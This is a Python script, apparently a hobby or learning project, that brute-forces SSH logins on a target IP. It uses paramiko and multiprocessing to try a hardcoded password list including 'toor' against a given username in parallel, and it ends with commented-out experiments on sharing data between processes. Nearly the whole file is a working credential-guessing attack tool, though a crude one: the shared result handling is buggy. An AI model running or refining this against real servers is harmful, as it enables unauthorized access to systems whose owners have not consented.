import multiprocessing as mp
import paramiko
import time
import optparse
from net_tools import get_ping

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="IP of the server you want to brute force")
    parser.add_option("-u", "--user", dest="user", help="user name on the server")
    parser.add_option("-p", "--protocol", dest="protocol", help="Protocol you want to use (SSH, FTP...)")
    (options, arguments) = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify an IP address --help for more info")
    elif not options.protocol:
        parser.error("[-] Please specify a protocol, use --help for more info")
    elif not options.user:
        parser.error("[-] Please specify a username, use --help for more info")
    return options 

def ssh_attack(user,address,password,event, array,q):
    if not event.is_set():
        print('Testing password: ' + password)
        try :
            ssh.connect(address, username=user, password=password)
            array=password
            print(password)
            event.set()
            return True

        except paramiko.ssh_exception.AuthenticationException:
            print("authentication failed")
            return False

def init(vv):
    global v
    v = vv

if __name__ == '__main__':
    options = get_arguments()
    print("[+]Preparing brute force on server at IP "+ options.target)

    #Checking if the server can be pinged
    get_ping(str(options.target))

    #retrieving a dictionnary of password
    pass_list = ['test1','test2','test3', 'toor', 'test3', 'test3', 'test3']

    #creating the ssh connection object
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    #Preparing the multiprocessing
    #Preparing the pool
    #pool = mp.Pool(processes=4)

    # Preparing the array to return the password value
    q = mp.Queue()
    array = mp.Array('c', 15)
    pool = mp.Pool(initializer=init, initargs = (array,), processes=4)
    manager = mp.Manager()
    event = manager.Event()

    t1 = time.time()

    '''For Asynchronous'''
    #for x in pass_list:
    #    re = pool.apply_async(ssh_attack, args=(options.user, options.target, x, event, array))
    #print(re.get())

##############################3

    for password in pass_list:
        p = mp.Process(target=ssh_attack, args=(options.user, options.target, password, event,array,q))
        p.start()
        #print(q.get())
        #p.join()
    print(array[:])
#########################33
    print('Code executed in: ', time.time() - t1)
    
    ####################################################
    #Test on data sharing in multiprocessing
    #Also see here for some more doc on share c_types
    # https://docs.python.org/3/library/multiprocessing.html#module-multiprocessing.sharedctypes
    ####################################################
#    def f(q,x,n, array):
#    print(x%2)
#    if x==3:
#        n.value = 3
#        i =0
#        #for j in "test":
#        #    array[i] = j
#        #    i+=1
#        array="test"
#
#    q.put([x])
#
#if __name__ == '__main__':
#    n = Value('i',1)
#    q = Queue()
#    array = Array('c', 15)
#
#    p = [Process(target=f, args=(q,x,n,array)) for x in range(5)]
#    for pr in p:
#       pr.start()
#        print(q.get())    # prints "[42, None, 'hello']"
#        pr.join()
#print(n.value)
#print(array[:])
